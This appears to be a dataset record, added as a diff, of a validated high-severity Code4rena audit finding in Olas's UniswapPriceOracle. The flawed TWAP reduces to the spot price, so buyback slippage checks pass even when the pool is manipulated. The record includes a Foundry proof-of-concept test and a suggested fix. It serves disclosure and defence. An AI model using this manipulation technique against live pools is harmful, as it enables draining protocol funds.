@@ -1,0 +1,130 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "Olas_j3PRAMM3fVq",
+    "audit_uid": "j3PRAMM3fVq",
+    "requested_submission_uid": "o7uYLjquEzf",
+    "requested_finding_uid": "9eKVuFn3L2m",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/Olas_j3PRAMM3fVq/20260618_133156/findings.json",
+    "source_submission_uid": "o7uYLjquEzf",
+    "source_finding_uid": "9eKVuFn3L2m",
+    "original_report_path": "Olas_j3PRAMM3fVq\\high_valid_o7uYLjquEzf.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "o7uYLjquEzf",
+  "finding_uid": "9eKVuFn3L2m",
+  "finding_number": "2",
+  "title": "UniswapPriceOracle.validatePrice collapses to spot price, allowing slippage checks to pass under manipulation",
+  "severity": "high",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "0x_DyDx",
+  "body": "## Summary\n`UniswapPriceOracle.validatePrice()` computes a TWAP that is always equal to the current spot price, so the slippage check effectively never fails.\n\n## Finding Description\n`validatePrice()` uses the pair’s cumulative price at the last update (`cumulativePriceLast`) and the current spot price (`tradePrice`) to synthesize a new cumulative price. It then computes the TWAP using:\n\n```solidity\n(cumulativePrice - cumulativePriceLast) / elapsedTime\n```\n\nBut since `cumulativePrice` is computed as `cumulativePriceLast + tradePrice * elapsedTime`, the TWAP simplifies to `tradePrice`. This makes the `derivation` always 0, causing `validatePrice()` to return `true` whenever at least one block has elapsed. As a result, the slippage guard in `BuyBackBurner._buyOLAS()` becomes ineffective and the contract can execute swaps at manipulated prices.\n\nThis breaks the expected security guarantee that buybacks are protected by a TWAP-based slippage check. A malicious actor can temporarily skew the Uniswap V2 pool (e.g., with a flash loan) and call `buyBack`, causing the protocol to trade at a distorted price. Because the check uses the manipulated spot price as the “TWAP,” it passes even for extreme deviations.\n\n## Impact Explanation\nBuybacks can be executed at arbitrarily manipulated prices, enabling extraction of value from the treasury/BuyBackBurner contract. This is a direct loss scenario when the pool is manipulated around the buyback transaction.\n\n## Likelihood Explanation\nThe bug is deterministic and always present when `validatePrice()` is used. Uniswap V2 pools are trivially manipulable within a single transaction via flash liquidity, and `buyBack` is permissionless. A motivated attacker can exploit this whenever funds are available.\n\n## Recommendation\nImplement a true TWAP calculation using two different cumulative price observations over time. For example:\n- Store `cumulativePriceLast` and `blockTimestampLast` in the oracle, update them on a fixed interval, and compare the current cumulative price to the stored values; or\n- Use UniswapV2OracleLibrary’s `currentCumulativePrices()` and compute TWAP over a minimum window.\n\nAdditionally, set `amountOutMinimum` on swaps based on the oracle to avoid trading at bad spot prices even if oracle validation is bypassed.",
+  "proof_of_concept": "## Proof of Concept\nFoundry test reproduces the issue:\n- File: `2026-01-olas/autonolas-tokenomics/test/UniswapPriceOracle.t.sol`\n- Command:\n```bash\ncd /workspaces/codespaces-blank/2026-01-olas/autonolas-tokenomics\nforge test --match-contract UniswapPriceOraclePoC -vvv\n```\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {ZuniswapV2Factory} from \"zuniswapv2/ZuniswapV2Factory.sol\";\nimport {ZuniswapV2Pair} from \"zuniswapv2/ZuniswapV2Pair.sol\";\nimport {MockERC20} from \"../lib/zuniswapv2/lib/solmate/src/test/utils/mocks/MockERC20.sol\";\nimport {UniswapPriceOracle} from \"../contracts/oracles/UniswapPriceOracle.sol\";\n\ncontract UniswapPriceOraclePoC is Test {\n    function testValidatePriceIgnoresLargePriceMove() public {\n        MockERC20 olas = new MockERC20(\"OLAS\", \"OLAS\", 18);\n        MockERC20 second = new MockERC20(\"DAI\", \"DAI\", 18);\n\n        uint256 mintAmount = 10_000_000 ether;\n        olas.mint(address(this), mintAmount);\n        second.mint(address(this), mintAmount);\n\n        ZuniswapV2Factory factory = new ZuniswapV2Factory();\n        factory.createPair(address(olas), address(second));\n        address pairAddr = factory.pairs(address(olas), address(second));\n        ZuniswapV2Pair pair = ZuniswapV2Pair(pairAddr);\n\n        // Seed initial 1:1 liquidity\n        uint256 initialLiquidity = 1_000 ether;\n        olas.transfer(pairAddr, initialLiquidity);\n        second.transfer(pairAddr, initialLiquidity);\n        pair.mint(address(this));\n\n        UniswapPriceOracle oracle = new UniswapPriceOracle(address(second), 10, pairAddr);\n\n        uint256 priceBefore = oracle.getPrice();\n\n        // Advance time to ensure non-zero elapsed time for TWAP calculation\n        vm.warp(block.timestamp + 1 hours);\n\n        // Skew reserves massively to move spot price\n        uint256 skewAmount = 1_000_000 ether;\n        second.transfer(pairAddr, skewAmount);\n        pair.sync();\n\n        // Ensure elapsedTime > 0 for validatePrice\n        vm.warp(block.timestamp + 1);\n\n        uint256 priceAfter = oracle.getPrice();\n\n        // Price must change materially (OLAS per second token drops)\n        assertLt(priceAfter * 1000, priceBefore);\n\n        // Slippage check should fail but bug makes it pass\n        bool ok = oracle.validatePrice(1);\n        assertTrue(ok);\n    }\n}\n\n```\nThe test shows a >1000x price move yet `validatePrice(1)` still returns `true`.",
+  "lines_of_code": [
+    "https://github.com/valory-xyz/autonolas-tokenomics/blob/v1.4.2-pre-external-audit/contracts/oracles/UniswapPriceOracle.sol#L53-L90",
+    "https://github.com/valory-xyz/autonolas-tokenomics/blob/v1.4.2-pre-external-audit/contracts/utils/BuyBackBurner.sol#L173-L200"
+  ],
+  "source_record": {
+    "project_id": "j3PRAMM3fVq",
+    "submission_index": "45",
+    "api_submission_id": "",
+    "uid": "o7uYLjquEzf",
+    "number": "45",
+    "title": "UniswapPriceOracle.validatePrice collapses to spot price, allowing slippage checks to pass under manipulation",
+    "severity": "high",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "0x_DyDx",
+    "lines_of_code": [
+      "https://github.com/valory-xyz/autonolas-tokenomics/blob/v1.4.2-pre-external-audit/contracts/oracles/UniswapPriceOracle.sol#L53-L90",
+      "https://github.com/valory-xyz/autonolas-tokenomics/blob/v1.4.2-pre-external-audit/contracts/utils/BuyBackBurner.sol#L173-L200"
+    ],
+    "body": "## Summary\n`UniswapPriceOracle.validatePrice()` computes a TWAP that is always equal to the current spot price, so the slippage check effectively never fails.\n\n## Finding Description\n`validatePrice()` uses the pair’s cumulative price at the last update (`cumulativePriceLast`) and the current spot price (`tradePrice`) to synthesize a new cumulative price. It then computes the TWAP using:\n\n```solidity\n(cumulativePrice - cumulativePriceLast) / elapsedTime\n```\n\nBut since `cumulativePrice` is computed as `cumulativePriceLast + tradePrice * elapsedTime`, the TWAP simplifies to `tradePrice`. This makes the `derivation` always 0, causing `validatePrice()` to return `true` whenever at least one block has elapsed. As a result, the slippage guard in `BuyBackBurner._buyOLAS()` becomes ineffective and the contract can execute swaps at manipulated prices.\n\nThis breaks the expected security guarantee that buybacks are protected by a TWAP-based slippage check. A malicious actor can temporarily skew the Uniswap V2 pool (e.g., with a flash loan) and call `buyBack`, causing the protocol to trade at a distorted price. Because the check uses the manipulated spot price as the “TWAP,” it passes even for extreme deviations.\n\n## Impact Explanation\nBuybacks can be executed at arbitrarily manipulated prices, enabling extraction of value from the treasury/BuyBackBurner contract. This is a direct loss scenario when the pool is manipulated around the buyback transaction.\n\n## Likelihood Explanation\nThe bug is deterministic and always present when `validatePrice()` is used. Uniswap V2 pools are trivially manipulable within a single transaction via flash liquidity, and `buyBack` is permissionless. A motivated attacker can exploit this whenever funds are available.\n\n## Recommendation\nImplement a true TWAP calculation using two different cumulative price observations over time. For example:\n- Store `cumulativePriceLast` and `blockTimestampLast` in the oracle, update them on a fixed interval, and compare the current cumulative price to the stored values; or\n- Use UniswapV2OracleLibrary’s `currentCumulativePrices()` and compute TWAP over a minimum window.\n\nAdditionally, set `amountOutMinimum` on swaps based on the oracle to avoid trading at bad spot prices even if oracle validation is bypassed.",
+    "proof_of_concept": "## Proof of Concept\nFoundry test reproduces the issue:\n- File: `2026-01-olas/autonolas-tokenomics/test/UniswapPriceOracle.t.sol`\n- Command:\n```bash\ncd /workspaces/codespaces-blank/2026-01-olas/autonolas-tokenomics\nforge test --match-contract UniswapPriceOraclePoC -vvv\n```\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {ZuniswapV2Factory} from \"zuniswapv2/ZuniswapV2Factory.sol\";\nimport {ZuniswapV2Pair} from \"zuniswapv2/ZuniswapV2Pair.sol\";\nimport {MockERC20} from \"../lib/zuniswapv2/lib/solmate/src/test/utils/mocks/MockERC20.sol\";\nimport {UniswapPriceOracle} from \"../contracts/oracles/UniswapPriceOracle.sol\";\n\ncontract UniswapPriceOraclePoC is Test {\n    function testValidatePriceIgnoresLargePriceMove() public {\n        MockERC20 olas = new MockERC20(\"OLAS\", \"OLAS\", 18);\n        MockERC20 second = new MockERC20(\"DAI\", \"DAI\", 18);\n\n        uint256 mintAmount = 10_000_000 ether;\n        olas.mint(address(this), mintAmount);\n        second.mint(address(this), mintAmount);\n\n        ZuniswapV2Factory factory = new ZuniswapV2Factory();\n        factory.createPair(address(olas), address(second));\n        address pairAddr = factory.pairs(address(olas), address(second));\n        ZuniswapV2Pair pair = ZuniswapV2Pair(pairAddr);\n\n        // Seed initial 1:1 liquidity\n        uint256 initialLiquidity = 1_000 ether;\n        olas.transfer(pairAddr, initialLiquidity);\n        second.transfer(pairAddr, initialLiquidity);\n        pair.mint(address(this));\n\n        UniswapPriceOracle oracle = new UniswapPriceOracle(address(second), 10, pairAddr);\n\n        uint256 priceBefore = oracle.getPrice();\n\n        // Advance time to ensure non-zero elapsed time for TWAP calculation\n        vm.warp(block.timestamp + 1 hours);\n\n        // Skew reserves massively to move spot price\n        uint256 skewAmount = 1_000_000 ether;\n        second.transfer(pairAddr, skewAmount);\n        pair.sync();\n\n        // Ensure elapsedTime > 0 for validatePrice\n        vm.warp(block.timestamp + 1);\n\n        uint256 priceAfter = oracle.getPrice();\n\n        // Price must change materially (OLAS per second token drops)\n        assertLt(priceAfter * 1000, priceBefore);\n\n        // Slippage check should fail but bug makes it pass\n        bool ok = oracle.validatePrice(1);\n        assertTrue(ok);\n    }\n}\n\n```\nThe test shows a >1000x price move yet `validatePrice(1)` still returns `true`.",
+    "detail_url": "https://code4rena.com/api/v1/audits/j3PRAMM3fVq/submissions/45",
+    "raw": {
+      "auditUid": "j3PRAMM3fVq",
+      "createdAt": "2026-01-23T09:28:24.213Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "czPzxgS22ad",
+          "userUid": "qRHoF9ASsG7",
+          "userAuditRole": "sponsor",
+          "createdAt": "2026-02-13T19:38:58.707Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "9eKVuFn3L2m"
+        },
+        {
+          "uid": "6ZaYkiZfpDd",
+          "userUid": "YP8WqAJEHSw",
+          "userAuditRole": "judge",
+          "createdAt": "2026-03-11T14:28:01.741Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "9eKVuFn3L2m"
+        },
+        {
+          "uid": "Ctdm33uRFhc",
+          "userUid": "YP8WqAJEHSw",
+          "userAuditRole": "judge",
+          "createdAt": "2026-03-11T14:28:28.854Z",
+          "type": "severity",
+          "value": "high",
+          "submissionUid": null,
+          "findingUid": "9eKVuFn3L2m"
+        },
+        {
+          "uid": "pN4CYWyvgxe",
+          "userUid": "YP8WqAJEHSw",
+          "userAuditRole": "judge",
+          "createdAt": "2026-03-11T14:41:35.912Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "o7uYLjquEzf",
+          "findingUid": null
+        }
+      ],
+      "finding": {
+        "uid": "9eKVuFn3L2m",
+        "number": 2,
+        "duplicates": 129
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "high",
+        "validity": "valid",
+        "updatedAt": "2026-03-13T20:28:53.654Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "high",
+      "team": null,
+      "title": "UniswapPriceOracle.validatePrice collapses to spot price, allowing slippage checks to pass under manipulation",
+      "uid": "o7uYLjquEzf",
+      "updatedAt": "2026-01-23T09:28:24.213Z",
+      "user": {
+        "uid": "UYBE3u9pLKo",
+        "handle": "0x_DyDx"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "## Summary\n`UniswapPriceOracle.validatePrice()` computes a TWAP that is always equal to the current spot price, so the slippage check effectively never fails.\n\n## Finding Description\n`validatePrice()` uses the pair’s cumulative price at the last update (`cumulativePriceLast`) and the current spot price (`tradePrice`) to synthesize a new cumulative price. It then computes the TWAP using:\n\n```solidity\n(cumulativePrice - cumulativePriceLast) / elapsedTime\n```\n\nBut since `cumulativePrice` is computed as `cumulativePriceLast + tradePrice * elapsedTime`, the TWAP simplifies to `tradePrice`. This makes the `derivation` always 0, causing `validatePrice()` to return `true` whenever at least one block has elapsed. As a result, the slippage guard in `BuyBackBurner._buyOLAS()` becomes ineffective and the contract can execute swaps at manipulated prices.\n\nThis breaks the expected security guarantee that buybacks are protected by a TWAP-based slippage check. A malicious actor can temporarily skew the Uniswap V2 pool (e.g., with a flash loan) and call `buyBack`, causing the protocol to trade at a distorted price. Because the check uses the manipulated spot price as the “TWAP,” it passes even for extreme deviations.\n\n## Impact Explanation\nBuybacks can be executed at arbitrarily manipulated prices, enabling extraction of value from the treasury/BuyBackBurner contract. This is a direct loss scenario when the pool is manipulated around the buyback transaction.\n\n## Likelihood Explanation\nThe bug is deterministic and always present when `validatePrice()` is used. Uniswap V2 pools are trivially manipulable within a single transaction via flash liquidity, and `buyBack` is permissionless. A motivated attacker can exploit this whenever funds are available.\n\n## Recommendation\nImplement a true TWAP calculation using two different cumulative price observations over time. For example:\n- Store `cumulativePriceLast` and `blockTimestampLast` in the oracle, update them on a fixed interval, and compare the current cumulative price to the stored values; or\n- Use UniswapV2OracleLibrary’s `currentCumulativePrices()` and compute TWAP over a minimum window.\n\nAdditionally, set `amountOutMinimum` on swaps based on the oracle to avoid trading at bad spot prices even if oracle validation is bypassed.",
+      "proofOfConcept": "## Proof of Concept\nFoundry test reproduces the issue:\n- File: `2026-01-olas/autonolas-tokenomics/test/UniswapPriceOracle.t.sol`\n- Command:\n```bash\ncd /workspaces/codespaces-blank/2026-01-olas/autonolas-tokenomics\nforge test --match-contract UniswapPriceOraclePoC -vvv\n```\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {ZuniswapV2Factory} from \"zuniswapv2/ZuniswapV2Factory.sol\";\nimport {ZuniswapV2Pair} from \"zuniswapv2/ZuniswapV2Pair.sol\";\nimport {MockERC20} from \"../lib/zuniswapv2/lib/solmate/src/test/utils/mocks/MockERC20.sol\";\nimport {UniswapPriceOracle} from \"../contracts/oracles/UniswapPriceOracle.sol\";\n\ncontract UniswapPriceOraclePoC is Test {\n    function testValidatePriceIgnoresLargePriceMove() public {\n        MockERC20 olas = new MockERC20(\"OLAS\", \"OLAS\", 18);\n        MockERC20 second = new MockERC20(\"DAI\", \"DAI\", 18);\n\n        uint256 mintAmount = 10_000_000 ether;\n        olas.mint(address(this), mintAmount);\n        second.mint(address(this), mintAmount);\n\n        ZuniswapV2Factory factory = new ZuniswapV2Factory();\n        factory.createPair(address(olas), address(second));\n        address pairAddr = factory.pairs(address(olas), address(second));\n        ZuniswapV2Pair pair = ZuniswapV2Pair(pairAddr);\n\n        // Seed initial 1:1 liquidity\n        uint256 initialLiquidity = 1_000 ether;\n        olas.transfer(pairAddr, initialLiquidity);\n        second.transfer(pairAddr, initialLiquidity);\n        pair.mint(address(this));\n\n        UniswapPriceOracle oracle = new UniswapPriceOracle(address(second), 10, pairAddr);\n\n        uint256 priceBefore = oracle.getPrice();\n\n        // Advance time to ensure non-zero elapsed time for TWAP calculation\n        vm.warp(block.timestamp + 1 hours);\n\n        // Skew reserves massively to move spot price\n        uint256 skewAmount = 1_000_000 ether;\n        second.transfer(pairAddr, skewAmount);\n        pair.sync();\n\n        // Ensure elapsedTime > 0 for validatePrice\n        vm.warp(block.timestamp + 1);\n\n        uint256 priceAfter = oracle.getPrice();\n\n        // Price must change materially (OLAS per second token drops)\n        assertLt(priceAfter * 1000, priceBefore);\n\n        // Slippage check should fail but bug makes it pass\n        bool ok = oracle.validatePrice(1);\n        assertTrue(ok);\n    }\n}\n\n```\nThe test shows a >1000x price move yet `validatePrice(1)` still returns `true`.",
+      "linesOfCode": "https://github.com/valory-xyz/autonolas-tokenomics/blob/v1.4.2-pre-external-audit/contracts/oracles/UniswapPriceOracle.sol#L53-L90,https://github.com/valory-xyz/autonolas-tokenomics/blob/v1.4.2-pre-external-audit/contracts/utils/BuyBackBurner.sol#L173-L200",
+      "number": 45,
+      "aiExplanation": null,
+      "_index": 45
+    }
+  }
+}
